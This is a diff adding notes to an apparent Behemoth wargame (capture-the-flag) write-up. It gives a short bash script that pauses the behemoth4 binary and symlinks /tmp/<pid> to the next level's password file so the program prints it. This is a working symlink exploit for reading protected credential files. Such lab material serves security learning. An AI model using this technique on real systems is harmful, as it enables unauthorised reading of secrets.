@@ -45,3 +45,24 @@ closes
 
 Idea... if you can control pid of a program, you can create a file in /tmp/controlledpid
 that is a symbolic link to behemoth5... then behemoth 4 will read the file out for us!
+
+Maybe create a script like...
+
+solution.sh
+-----------
+#!/bin/bash
+/behemoth/behemoth4 &
+PID="$!"
+touch "/tmp/$PID"
+ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID 
+
+close...
+
+updated:
+
+#!/bin/bash
+/behemoth/behemoth4 &
+PID="$!"
+kill -STOP $PID
+ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
+kill -CONT $PID
